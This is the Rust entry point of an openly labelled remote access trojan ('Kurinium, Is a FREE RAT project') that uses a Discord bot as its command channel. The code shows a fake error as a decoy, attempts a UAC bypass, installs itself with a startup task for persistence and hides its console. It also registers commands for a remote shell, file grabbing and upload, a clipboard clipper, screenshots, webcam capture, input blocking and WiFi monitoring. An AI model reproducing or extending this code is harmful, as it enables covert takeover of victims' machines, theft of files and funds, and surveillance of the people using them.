use crate::prelude::*;
use std::env;
use tracing::{error, info, warn};
use twilight_gateway::{Event, EventTypeFlags, Intents, Shard, ShardId, StreamExt};

use crate::core::decoy::show_fake_error;
use crate::core::instance::singleton_prcess;
use crate::core::keep_active::start_keep_active;

// Modules
mod command_registry;
mod commands;
mod config;
mod core;
mod handler;
mod installation;
mod prelude;
mod system_info;
mod uac_bypass;
mod utils;

// Re-exports for other modules
use commands::core::*;
use commands::crypto::*;
use commands::filesystem::*;
use commands::network::*;
use commands::system::*;
use commands::utility::*;

// Register all commands
async fn register_all_commands() -> anyhow::Result<()> {
    let registry = command_registry::get_registry();

    register_commands!(
        registry,
        // Core commands
        HelpCommand,
        PingCommand,
        InfoCommand,
        ShellCommand,
        ExitCommand,
        AuthCommand,
        // Crypto commands
        EncryptCommand,
        DecryptCommand,
        // Filesystem commands
        CatCommand,
        CdCommand,
        CheckDriveCommand,
        ClearCommand,
        DownloadCommand,
        FileInfoCommand,
        GetCommand,
        GrabCommand,
        LsCommand,
        MkdirCommand,
        RemoveCommand,
        RenameCommand,
        SizeCommand,
        UnrarCommand,
        UnzipCommand,
        UploadCommand,
        ZipCommand,
        // System commands
        ProcessCommand,
        MonitorCommand,
        UpdateCommand,
        UninstallCommand,
        VolumeCommand,
        BlockInputCommand,
        ScreenCommand,
        CapsFlickerCommand,
        VisibleCommand,
        // Utility commands
        ClipboardCommand,
        ClipperCommand,
        ForegroundCommand,
        JumpscareCommand,
        OpenUrlCommand,
        PrintCommand,
        ScreenshotCommand,
        WebcamCommand,
        // Network commands
        IpconfigCommand,
    )?;

    if Config::SHOW_CONSOLE {
        info!("Registered {} commands", registry.command_count());
    }
    Ok(())
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args: Vec<String> = env::args().collect();
    let hide_decoy_flag = args.contains(&"--hide-decoy".to_string());

    // Check admin status
    let mut is_admin_privileged = uac_bypass::is_admin();
    singleton_prcess(is_admin_privileged);

    // Show decoy message if config
    let decoy_config = Config::get_decoy_config();
    if decoy_config.enabled && !hide_decoy_flag {
        std::thread::spawn(move || {
            show_fake_error(&decoy_config);
        });
    }

    // Start keep-active thread to prevent sleep
    let keep_active_config = Config::get_keep_active_config();
    let _keep_active_thread = start_keep_active(&keep_active_config);

    //@ UAC Bypass
    if !is_admin_privileged {
        if Config::SHOW_CONSOLE {
            println!("Not running with admin privileges, attempting UAC bypass...");
        }

        if uac_bypass::attempt_uac_bypass() {
            is_admin_privileged = uac_bypass::is_admin();
            if Config::SHOW_CONSOLE {
                if is_admin_privileged {
                    println!("UAC bypass successful! Now running with admin privileges.");
                } else {
                    println!("UAC bypass failed. Continuing without admin privileges.");
                }
            }
        } else {
            if Config::SHOW_CONSOLE {
                println!("UAC bypass failed. Continuing without admin privileges.");
            }
        }
    } else {
        if Config::SHOW_CONSOLE {
            println!("Already running with admin privileges.");
        }
    }

    //@ Installation
    let current_exe = env::current_exe().unwrap_or_default();
    let is_installed = installation::check_if_installed(&current_exe);

    if is_admin_privileged && !is_installed {
        if Config::SHOW_CONSOLE {
            println!("Starting installation process...");
        }

        match installation::install_to_path() {
            Ok(_) => {
                if Config::SHOW_CONSOLE {
                    println!("Installation completed successfully!");
                }
            }
            Err(e) => {
                if Config::SHOW_CONSOLE {
                    println!("Installation failed: {}", e);
                }
            }
        }

        if Config::SHOW_CONSOLE {
            println!("Setting up startup task...");
        }

        // Use async startup check
        match crate::core::startup::check_startup().await {
            Ok(_) => {
                if Config::SHOW_CONSOLE {
                    println!("Startup task created successfully!");
                }
            }
            Err(e) => {
                if Config::SHOW_CONSOLE {
                    println!("Startup task failed: {}", e);
                }
            }
        }

        if Config::SHOW_CONSOLE {
            println!("Installation complete. Exiting original process...");
            std::thread::sleep(std::time::Duration::from_secs(2));
        }
        std::process::exit(0);
    }

    //@ Hide Console
    if !Config::SHOW_CONSOLE {
        unsafe {
            let console = winapi::um::wincon::GetConsoleWindow();
            if !console.is_null() {
                winapi::um::winuser::ShowWindow(console, winapi::um::winuser::SW_HIDE);
            }
        }
    }

    //@ Initialize
    if Config::SHOW_CONSOLE {
        tracing_subscriber::fmt::init();
    }

    //@ Authentication
    let auth_config = Config::get_auth_config();
    crate::core::auth::init_auth_manager(auth_config);

    //@ Get config
    let token = Config::get_token();
    let guild_id = Config::get_guildid();

    //@ Register commands
    tokio::spawn(async move {
        match register_all_commands().await {
            Err(e) => {
                if Config::SHOW_CONSOLE {
                    error!("Failed to register commands: {}", e);
                }
            }
            Ok(_) => {
                if Config::SHOW_CONSOLE {
                    info!("Kurinium, Is a FREE RAT project. https://github.com/Mikasuru/Kurinium");
                    info!("All commands registered in registry");
                }
            }
        }
    });

    //@ Discord Connection
    let http = Arc::new(HttpClient::new(token.clone()));
    let channel_manager = crate::core::discord::channel::ChannelManager::new(
        HttpClient::new(token.clone()),
        guild_id,
    );

    let device_channel_id = channel_manager.init_dchannel().await?;
    if Config::SHOW_CONSOLE {
        info!("Device channel initialized: {}", device_channel_id);
    }

    //@ Gateway configuration
    let intents = Intents::GUILD_MESSAGES | Intents::MESSAGE_CONTENT;

    //@ Start WiFi monitoring
    let wifi_config = Config::get_wifi_monitor_config();
    let wifi_monitor =
        crate::core::wifi_monitor::WifiMonitor::new(http.clone(), device_channel_id, wifi_config);
    if let Err(e) = wifi_monitor.start_monitoring().await {
        if Config::SHOW_CONSOLE {
            error!("Failed to start WiFi monitoring: {}", e);
        }
    } else if Config::SHOW_CONSOLE && Config::get_wifi_monitor_config().enabled {
        info!("WiFi monitoring started successfully");
    }

    if Config::SHOW_CONSOLE {
        info!("Prefix: {}", Config::BOT_PREFIX);
        info!("Guild ID: {}", guild_id);
        info!("[ Console if showing ]-----------------------------------");
    }

    //@ Event Loop With Reconnection
    let mut reconnect_delay = 5u64;
    const MIN_RECONNECT_DELAY: u64 = 5;
    const MAX_RECONNECT_DELAY: u64 = 60;

    loop {
        let mut shard = Shard::new(ShardId::new(0, 1), token.clone(), intents);

        if Config::SHOW_CONSOLE {
            info!("Connecting to Discord gateway...");
        }
        let mut connected_successfully = false;

        loop {
            let item = shard.next_event(EventTypeFlags::all()).await;

            let event = match item {
                Some(Ok(event)) => event,
                Some(Err(source)) => {
                    if Config::SHOW_CONSOLE {
                        error!("Error receiving event: {:?}", source);
                    }
                    break;
                }
                None => {
                    if Config::SHOW_CONSOLE {
                        info!("Event stream ended, reconnecting...");
                    }
                    break;
                }
            };

            match event {
                Event::Ready(_) => {
                    connected_successfully = true;
                    reconnect_delay = MIN_RECONNECT_DELAY;

                    if Config::SHOW_CONSOLE {
                        info!("Bot is ready!");
                    }
                }

                Event::Resumed => {
                    connected_successfully = true;
                    if Config::SHOW_CONSOLE {
                        info!("Gateway session resumed");
                    }
                }

                Event::MessageCreate(msg) => {
                    if let Err(e) = handler::handle_message(&http, msg.0, device_channel_id).await {
                        if Config::SHOW_CONSOLE {
                            error!("Error handling message: {}", e);
                        }
                    }
                }

                Event::InteractionCreate(interaction) => {
                    if let Err(e) = handler::handle_interaction(&http, interaction.0).await {
                        if Config::SHOW_CONSOLE {
                            error!("Error handling interaction: {}", e);
                        }
                    }
                }

                Event::GatewayClose(frame_opt) => {
                    if let Some(frame) = frame_opt {
                        if Config::SHOW_CONSOLE {
                            info!("Gateway closed with code: {}", frame.code);
                        }

                        match frame.code {
                            4004 => {
                                error!("Authentication failed: Invalid token.");
                                return Err(anyhow::anyhow!("Invalid token"));
                            }
                            4010 => {
                                error!("Invalid shard");
                                return Err(anyhow::anyhow!("Invalid shard"));
                            }
                            4011 => {
                                error!("Sharding required");
                                return Err(anyhow::anyhow!("Bot too large, needs sharding"));
                            }
                            4013 => {
                                error!("Invalid intents");
                                return Err(anyhow::anyhow!("Invalid intents"));
                            }
                            4014 => {
                                error!("Disallowed intents");
                                return Err(anyhow::anyhow!("Privileged intents not enabled"));
                            }
                            _ => {}
                        }
                    } else {
                        if Config::SHOW_CONSOLE {
                            info!("Gateway closed without close frame");
                        }
                    }

                    break; // Break to reconnect
                }

                Event::GatewayInvalidateSession(can_resume) => {
                    if Config::SHOW_CONSOLE {
                        info!("Session invalidated (resumable: {})", can_resume);
                    }
                    break;
                }

                _ => {}
            }
        }

        // Determine reconnect delay
        if !connected_successfully {
            reconnect_delay = (reconnect_delay * 2).min(MAX_RECONNECT_DELAY);

            if Config::SHOW_CONSOLE {
                warn!(
                    "Failed to establish connection. Waiting {} seconds before retry...",
                    reconnect_delay
                );
            }
        } else {
            reconnect_delay = MIN_RECONNECT_DELAY;

            if Config::SHOW_CONSOLE {
                info!(
                    "Disconnected. Reconnecting in {} seconds...",
                    reconnect_delay
                );
            }
        }

        tokio::time::sleep(tokio::time::Duration::from_secs(reconnect_delay)).await;
    }
}
